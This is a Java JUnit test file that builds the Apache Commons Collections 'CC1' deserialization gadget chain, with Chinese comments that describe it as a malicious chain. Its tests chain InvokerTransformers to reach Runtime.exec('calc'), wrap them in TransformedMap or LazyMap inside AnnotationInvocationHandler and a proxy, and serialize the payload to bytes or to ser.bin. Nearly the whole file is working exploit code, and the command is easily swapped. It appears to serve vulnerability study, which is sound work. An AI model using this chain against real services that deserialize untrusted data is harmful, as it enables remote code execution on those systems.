package org.example;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.example.utils.Deserializer;
import org.junit.jupiter.api.Test;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * jdk8u71之前
 */
public class CC1Test {
    @Test
    public void test1() throws IOException, ClassNotFoundException {
        ClassLoader classLoader = CC1Test.class.getClassLoader();
        InputStream inputStream = classLoader.getResourceAsStream("cc3.txt");
        Deserializer.deserialize(inputStream);
    }

    @Test
    public void test2() {
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        );
        invokerTransformer.transform(Runtime.getRuntime());

    }

    /**
     * TransformedMap类触发transform示例：
     *
     * @throws Exception
     */
    @Test
    public void test3() throws Exception {
        ConstantTransformer constantTransformer = new ConstantTransformer("1");
        InvokerTransformer invokerTransformer0 = new InvokerTransformer(
                "getClass",
                new Class[]{},
                new Object[]{}
        );
        InvokerTransformer invokerTransformer1 = new InvokerTransformer(
                "forName",
                new Class[]{String.class},
                new Object[]{"java.lang.Runtime"}
        );
        InvokerTransformer invokerTransformer2 = new InvokerTransformer(
                "getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[]{}}
        );
        InvokerTransformer invokerTransformer3 = new InvokerTransformer(
                "invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}
        );
        InvokerTransformer invokerTransformer4 = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        );

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                constantTransformer,
                invokerTransformer0,
                invokerTransformer1,
                invokerTransformer2,
                invokerTransformer3,
                invokerTransformer4,
                constantTransformer
        });

        HashMap<Object, Object> map = new HashMap<>();
        Map decorateMap = TransformedMap.decorate(map, chainedTransformer, chainedTransformer);
        decorateMap.put("hello", null);
    }

    /**
     * TransformedMap + AnnotationInvocationHandler
     */
    @Test
    public void res() {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 创建Map对象
        Map map = new HashMap();
        map.put("value", "value");

        // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
        Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

//        // 遍历Map元素，并调用setValue方法
//        for (Object obj : transformedMap.entrySet()) {
//            Map.Entry entry = (Map.Entry) obj;
//
//            // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//            entry.setValue("test");
//        }
//
////        transformedMap.put("v1", "v2");// 执行put也会触发transform

        try {
            // 获取AnnotationInvocationHandler类对象
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

            // 获取AnnotationInvocationHandler类的构造方法
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

            // 设置构造方法的访问权限
            constructor.setAccessible(true);

            // 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
            // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
            Object instance = constructor.newInstance(Target.class, transformedMap);

            // 创建用于存储payload的二进制输出流对象
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            // 创建Java对象序列化输出流对象
            ObjectOutputStream out = new ObjectOutputStream(baos);

            // 序列化AnnotationInvocationHandler类
            out.writeObject(instance);
            out.flush();
            out.close();

            // 获取序列化的二进制数组
            byte[] bytes = baos.toByteArray();

            // 输出序列化的二进制数组
            System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

            // 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

            // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
            ObjectInputStream in = new ObjectInputStream(bais);

            // 模拟远程的反序列化过程
            in.readObject();

            // 关闭ObjectInputStream输入流
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Gadget chain:
     * 		ObjectInputStream.readObject()
     * 			AnnotationInvocationHandler.readObject()
     * 				Map(Proxy).entrySet()
     * 					AnnotationInvocationHandler.invoke()
     * 						LazyMap.get()
     * 							ChainedTransformer.transform()
     * 								ConstantTransformer.transform()
     * 								InvokerTransformer.transform()
     * 									Method.invoke()
     * 										Class.getMethod()
     * 								InvokerTransformer.transform()
     * 									Method.invoke()
     * 										Runtime.getRuntime()
     * 								InvokerTransformer.transform()
     * 									Method.invoke()
     * 										Runtime.exec()
     *
     * 	Requires:
     * 		commons-collections
     * 	因为需要invoke()触发，所以包了一层代理
     */
    @Test
    public void res1() throws IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer(1)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                , new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

        serialize(invocationHandler);
//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
